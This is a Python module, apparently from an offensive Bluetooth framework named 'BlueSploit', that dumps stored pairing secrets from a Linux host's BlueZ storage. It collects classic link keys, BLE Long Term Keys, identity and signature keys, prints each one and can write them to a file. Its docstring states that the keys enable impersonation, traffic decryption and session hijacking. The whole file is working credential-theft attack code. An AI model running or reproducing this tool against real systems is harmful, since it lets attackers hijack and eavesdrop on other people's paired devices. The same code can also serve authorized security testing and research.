"""
Bluetooth Link Key Dump
Extracts stored Bluetooth link keys from /var/lib/bluetooth/ on Linux.

Link keys are stored after successful pairing between devices. Extracting
them enables impersonation, traffic decryption, and session hijacking
without re-pairing.

Targets:
  - /var/lib/bluetooth/<adapter>/<device>/info, BlueZ 5.x key storage
  - Legacy: /var/lib/bluetooth/<adapter>/linkkeys
"""

import os
import re
import configparser
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity


class Module(AuxiliaryModule):

    info = ModuleInfo(
        name="Link Key Dump",
        description="Extract stored Bluetooth link keys from /var/lib/bluetooth/",
        author="BlueSploit Team",
        protocol=BTProtocol.DUAL,
        references=[
            "https://git.kernel.org/pub/scm/bluetooth/bluez.git/tree/doc/settings-storage.txt",
            "https://blog.quarkslab.com/bluetooth-security.html",
        ],
        severity=Severity.HIGH,
        cve=None,
    )

    BT_DIR = "/var/lib/bluetooth"

    def _setup_options(self):
        self.add_option(ModuleOption(
            name="adapter",
            required=False,
            description="Specific adapter MAC to dump (empty = all adapters)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="target",
            required=False,
            description="Specific paired device MAC to dump (empty = all)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="output_file",
            required=False,
            description="Save extracted keys to file",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="show_ltk",
            required=False,
            description="Also extract BLE Long Term Keys (true/false)",
            default="true",
        ))
        self.add_option(ModuleOption(
            name="bt_dir",
            required=False,
            description="Bluetooth storage directory (default: /var/lib/bluetooth)",
            default="/var/lib/bluetooth",
        ))

    def run(self) -> bool:
        adapter_filter = self.get_option("adapter")
        target_filter = self.get_option("target")
        output_file = self.get_option("output_file")
        show_ltk = (self.get_option("show_ltk") or "true").lower() == "true"
        bt_dir = self.get_option("bt_dir") or self.BT_DIR

        if not os.path.isdir(bt_dir):
            self.print_error(f"Bluetooth directory not found: {bt_dir}")
            self.print_status("Are you running on a Linux system with BlueZ?")
            return False

        if not os.access(bt_dir, os.R_OK):
            self.print_error(f"Cannot read {bt_dir}, root privileges required")
            return False

        self.print_status(f"Scanning {bt_dir} for stored keys...")

        all_keys = []
        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')

        # Enumerate adapters
        try:
            adapters = [d for d in os.listdir(bt_dir)
                       if mac_pattern.match(d) and os.path.isdir(os.path.join(bt_dir, d))]
        except PermissionError:
            self.print_error("Permission denied reading bluetooth directory")
            return False

        if not adapters:
            self.print_warning("No Bluetooth adapters found in storage")
            return False

        for adapter_mac in sorted(adapters):
            if adapter_filter and adapter_mac.upper() != adapter_filter.upper():
                continue

            adapter_path = os.path.join(bt_dir, adapter_mac)
            self.print_status(f"\nAdapter: {adapter_mac}")

            # Enumerate paired devices
            try:
                entries = os.listdir(adapter_path)
            except PermissionError:
                self.print_warning(f"  Cannot read {adapter_path}")
                continue

            device_count = 0
            for entry in sorted(entries):
                if not mac_pattern.match(entry):
                    continue

                device_mac = entry
                if target_filter and device_mac.upper() != target_filter.upper():
                    continue

                device_path = os.path.join(adapter_path, device_mac)
                info_file = os.path.join(device_path, "info")

                if not os.path.isfile(info_file):
                    continue

                device_count += 1
                keys = self._extract_keys(info_file, adapter_mac, device_mac, show_ltk)
                all_keys.extend(keys)

            # Check legacy linkkeys file
            legacy_file = os.path.join(adapter_path, "linkkeys")
            if os.path.isfile(legacy_file):
                legacy_keys = self._extract_legacy_keys(legacy_file, adapter_mac)
                all_keys.extend(legacy_keys)

            self.print_status(f"  Paired devices: {device_count}")

        # Report
        if not all_keys:
            self.print_warning("No link keys found")
            return False

        self.print_success(f"\nExtracted {len(all_keys)} key(s):\n")
        for key in all_keys:
            self._print_key(key)

        if output_file:
            self._save_keys(output_file, all_keys)

        return True

    def _extract_keys(self, info_file: str, adapter: str,
                      device: str, show_ltk: bool) -> list:
        """Extract keys from a BlueZ 5.x info file"""
        keys = []
        config = configparser.ConfigParser()

        try:
            config.read(info_file)
        except Exception as e:
            self.print_warning(f"  Cannot parse {info_file}: {e}")
            return keys

        # Device name
        device_name = config.get("General", "Name", fallback="Unknown")

        # Classic Link Key
        if config.has_section("LinkKey"):
            link_key = config.get("LinkKey", "Key", fallback=None)
            key_type = config.get("LinkKey", "Type", fallback="0")
            pin_length = config.get("LinkKey", "PINLength", fallback="0")

            if link_key:
                keys.append({
                    "type": "LinkKey",
                    "adapter": adapter,
                    "device": device,
                    "name": device_name,
                    "key": link_key,
                    "key_type": key_type,
                    "pin_length": pin_length,
                })
                self.print_success(f"  {device} ({device_name}): Classic Link Key found")

        # BLE Long Term Key
        if show_ltk and config.has_section("LongTermKey"):
            ltk = config.get("LongTermKey", "Key", fallback=None)
            authenticated = config.get("LongTermKey", "Authenticated", fallback="0")
            enc_size = config.get("LongTermKey", "EncSize", fallback="16")
            ediv = config.get("LongTermKey", "EDiv", fallback="0")
            rand_val = config.get("LongTermKey", "Rand", fallback="0")

            if ltk:
                keys.append({
                    "type": "LTK",
                    "adapter": adapter,
                    "device": device,
                    "name": device_name,
                    "key": ltk,
                    "authenticated": authenticated,
                    "enc_size": enc_size,
                    "ediv": ediv,
                    "rand": rand_val,
                })
                self.print_success(f"  {device} ({device_name}): BLE LTK found "
                                 f"(auth={authenticated})")

        # BLE Peripheral LTK (if device acts as peripheral)
        if show_ltk and config.has_section("PeripheralLongTermKey"):
            ltk = config.get("PeripheralLongTermKey", "Key", fallback=None)
            if ltk:
                keys.append({
                    "type": "PeripheralLTK",
                    "adapter": adapter,
                    "device": device,
                    "name": device_name,
                    "key": ltk,
                })
                self.print_success(f"  {device} ({device_name}): Peripheral LTK found")

        # Identity Resolving Key
        if show_ltk and config.has_section("IdentityResolvingKey"):
            irk = config.get("IdentityResolvingKey", "Key", fallback=None)
            if irk:
                keys.append({
                    "type": "IRK",
                    "adapter": adapter,
                    "device": device,
                    "name": device_name,
                    "key": irk,
                })
                self.print_status(f"  {device} ({device_name}): IRK found")

        # Connection Signature Resolving Key
        if show_ltk and config.has_section("LocalSignatureKey"):
            csrk = config.get("LocalSignatureKey", "Key", fallback=None)
            if csrk:
                keys.append({
                    "type": "CSRK",
                    "adapter": adapter,
                    "device": device,
                    "name": device_name,
                    "key": csrk,
                })

        return keys

    def _extract_legacy_keys(self, legacy_file: str, adapter: str) -> list:
        """Extract keys from legacy BlueZ linkkeys file"""
        keys = []
        try:
            with open(legacy_file) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split()
                    if len(parts) >= 2:
                        device = parts[0]
                        key = parts[1]
                        keys.append({
                            "type": "LinkKey (legacy)",
                            "adapter": adapter,
                            "device": device,
                            "name": "Unknown",
                            "key": key,
                        })
                        self.print_success(f"  {device}: Legacy link key found")
        except Exception as e:
            self.print_warning(f"  Cannot read legacy file: {e}")
        return keys

    def _print_key(self, key: dict):
        """Print a single extracted key"""
        self.print_status(f"  [{key['type']}] {key['adapter']} → {key['device']} ({key['name']})")
        self.print_status(f"    Key: {key['key']}")
        if key["type"] == "LinkKey":
            self.print_status(f"    Type: {key.get('key_type', '?')}  PIN Length: {key.get('pin_length', '?')}")
        elif key["type"] == "LTK":
            self.print_status(f"    Auth: {key.get('authenticated', '?')}  "
                            f"EncSize: {key.get('enc_size', '?')}  "
                            f"EDIV: {key.get('ediv', '?')}  Rand: {key.get('rand', '?')}")
        self.print_status("")

    def _save_keys(self, filepath: str, keys: list):
        """Save extracted keys to a file"""
        try:
            with open(filepath, "w") as f:
                f.write("# BlueSploit Link Key Dump\n")
                f.write(f"# Extracted: {len(keys)} key(s)\n\n")
                for key in keys:
                    f.write(f"[{key['type']}]\n")
                    f.write(f"Adapter={key['adapter']}\n")
                    f.write(f"Device={key['device']}\n")
                    f.write(f"Name={key['name']}\n")
                    f.write(f"Key={key['key']}\n")
                    for k, v in key.items():
                        if k not in ("type", "adapter", "device", "name", "key"):
                            f.write(f"{k}={v}\n")
                    f.write("\n")
            self.print_success(f"Keys saved to {filepath}")
        except Exception as e:
            self.print_error(f"Cannot save keys: {e}")
